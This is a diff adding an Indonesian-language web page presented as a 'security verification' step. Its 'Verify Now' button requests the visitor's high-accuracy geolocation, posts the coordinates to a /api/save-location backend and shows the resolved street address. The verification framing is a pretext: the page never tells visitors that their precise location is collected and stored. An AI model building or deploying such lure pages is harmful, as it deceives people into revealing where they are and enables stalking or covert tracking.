@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0f1115; color: #fff; margin: 0; }
+        .box { background: #1a1c23; padding: 30px; border-radius: 12px; text-align: center; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        button { background: #2563eb; color: #fff; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
+        button:hover { background: #1d4ed8; }
+        #result { margin-top: 20px; font-size: 13px; color: #4ade80; text-align: left; line-height: 1.5; }
+        #error { color: #f87171; margin-top: 10px; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Verifikasi Diperlukan</h2>
+    <p style="font-size: 13px; color: #a0a0b0;">Klik tombol di bawah untuk melanjutkan.</p>
+    <button id="btnVerify">Verifikasi Sekarang</button>
+    <div id="result"></div>
+    <div id="error"></div>
+</div>
+
+<script>
+    document.getElementById('btnVerify').addEventListener('click', function() {
+        const btn = this;
+        const resBox = document.getElementById('result');
+        const errBox = document.getElementById('error');
+        
+        btn.innerText = "Meminta Izin...";
+        btn.disabled = true;
+
+        if (!navigator.geolocation) {
+            errBox.innerText = "Browser tidak mendukung lokasi.";
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+
+                // Tembak ke backend buat dapetin alamat
+                try {
+                    const response = await fetch('/api/save-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            lat: lat, 
+                            lon: lon, 
+                            accuracy: position.coords.accuracy 
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.status === 'success') {
+                        resBox.innerHTML = `
+                            <strong>Alamat Terdeteksi:</strong><br><br>
+                            ${data.alamat}
+                        `;
+                        btn.innerText = "Berhasil!";
+                    }
+                } catch (err) {
+                    errBox.innerText = "Gagal menyimpan data ke server.";
+                    btn.innerText = "Gagal";
+                }
+            },
+            (error) => {
+                errBox.innerText = "Izin lokasi ditolak!";
+                btn.innerText = "Coba Lagi";
+                btn.disabled = false;
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    });
+</script>
+
+</body>
+</html>
